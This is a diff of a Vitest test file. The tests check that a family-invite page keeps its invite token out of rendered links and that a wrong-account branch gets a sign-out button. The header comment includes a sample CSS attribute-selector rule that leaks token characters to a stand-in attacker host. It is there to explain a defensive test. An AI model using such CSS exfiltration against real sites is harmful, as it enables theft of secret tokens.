@@ -5,26 +5,32 @@ import { renderToStaticMarkup } from "react-dom/server";
 import { beforeEach, describe, expect, it, vi } from "vitest";
 
 /**
- * #2827 — the invite token must not reach a CSS-selectable attribute on the
+ * #2827 — the invite token must not reach a rendered attribute on the
  * family-invite page.
  *
- * This is a `(public)` route, so it renders the club's normal chrome, which
- * injects the admin-authored **Raw CSS** from Site Appearance. A CSS attribute
- * selector reads a value one character at a time:
+ * The page used to build its sign-in link as
+ * `buildLoginPath('/family-invite/<token>')`, which put the token in an `href` and
+ * so in the visitor's address bar, history and `Referer`. The signed-out branch is
+ * a plain `/login` anchor now, and the post-login return address travels in the
+ * HttpOnly cookie `src/lib/family-invite-return-address.ts` documents.
+ *
+ * **The threat this file is named after is not the one that was live here, and the
+ * distinction was a review finding (20 Aug 2026).** A CSS attribute selector reads
+ * a value one character at a time —
  *
  *     a[href^="/family-invite/e7c1b9"] { background: url(https://attacker/e7c1b9); }
  *
- * The page used to build its sign-in link as
- * `buildLoginPath('/family-invite/<token>')`, so that link was an invite-token
- * oracle for anyone who can edit the site's styling. Both affordances are plain
- * `/login` anchors now, and the post-login return address travels in the HttpOnly
- * cookie `src/lib/family-invite-return-address.ts` documents.
+ * — and that oracle IS live on the `(website-dynamic)` group, whose chrome injects
+ * `theme.css` with admin Raw CSS appended. This is a `(public)` route, and
+ * `(public)/layout.tsx` injects `theme.appCss`, which excludes `rawCss` by design.
+ * So these assertions are defence in depth: they hold the line for the day this
+ * group moves under the shared chrome (as #2818 moved `(website-dynamic)`), and
+ * they pin the URL/history exposure that WAS real, closed.
  *
- * Two branches render such a link and both are covered: the signed-out branch,
- * and the wrong-account branch a signed-in visitor reaches when the invite was
- * sent to somebody else. The wrong-account branch matters independently — it is
- * the one a forwarded link lands on, so it is the one an attacker can reach with
- * a session of their own.
+ * Two branches are covered: the signed-out branch, and the wrong-account branch a
+ * signed-in visitor reaches when the invite was sent to somebody else. The
+ * wrong-account branch matters independently — it is the one a forwarded link lands
+ * on, so it is the one an attacker can reach with a session of their own.
  */
 
 /** A realistic 64-hex action token, with no repeating run, so a short prefix of
@@ -57,6 +63,10 @@ vi.mock("@/lib/prisma", () => ({
 vi.mock("@/lib/public-layout-config", () => ({
   getCachedClubIdentity: async () => ({ name: "Test Alpine Club" }),
 }));
+
+// The sign-out affordance's own dependency, stubbed so the REAL component still
+// renders here — its markup is part of what this suite measures.
+vi.mock("next-auth/react", () => ({ signOut: vi.fn() }));
 
 vi.mock("next/link", () => ({
   default: ({ href, children, ...rest }: { href: unknown; children: ReactNode }) => (
@@ -173,12 +183,37 @@ describe("family-invite page — the invite token stays out of the markup (#2827
     mockMemberFindUnique.mockResolvedValue({ email: "someone.else@example.com" });
 
     const { markup, host } = await renderPage();
-    const signIn = Array.from(host.querySelectorAll("a")).find((anchor) =>
-      (anchor.textContent ?? "").includes("Sign in with a different account"),
+
+    expectNoTokenAnywhere(markup, host);
+  });
+
+  it("gives the wrong-account branch a control that is not a bounce to /login", async () => {
+    // Review finding, 20 Aug 2026. This branch is reached BY a signed-in visitor,
+    // and `(public)/login/page.tsx` redirects an authenticated visitor straight
+    // back to their resolved landing — which, with the #2827 cookie at precedence
+    // 2, is this very page. So a `<Link href="/login">` here (and the pre-#2827
+    // `buildLoginPath(...)` link before it) bounced the visitor to the identical
+    // screen, with no sign-out affordance anywhere on a `(public)` page to reach
+    // instead. The control signs them out and returns them here.
+    mockAuth.mockResolvedValue({ user: { id: "member-1" } });
+    mockMemberFindUnique.mockResolvedValue({ email: "someone.else@example.com" });
+
+    const { host } = await renderPage();
+
+    expect(
+      Array.from(host.querySelectorAll("a")).map((anchor) =>
+        anchor.getAttribute("href"),
+      ),
+      "no anchor on this branch may point at /login — that is the bounce",
+    ).not.toContain("/login");
+    const control = Array.from(host.querySelectorAll("button")).find((button) =>
+      (button.textContent ?? "").includes("Sign out and use a different account"),
     );
 
-    expect(signIn?.getAttribute("href")).toBe("/login");
-    expectNoTokenAnywhere(markup, host);
+    expect(control, "the branch must offer a working way out").toBeTruthy();
+    // The real component, not a stub: it is what holds the return path, so this is
+    // also what makes `expectNoTokenAnywhere` above meaningful for this branch.
+    expect(control?.tagName).toBe("BUTTON");
   });
 
   it("still refuses the wrong signed-in email — the check this fix does not replace", async () => {
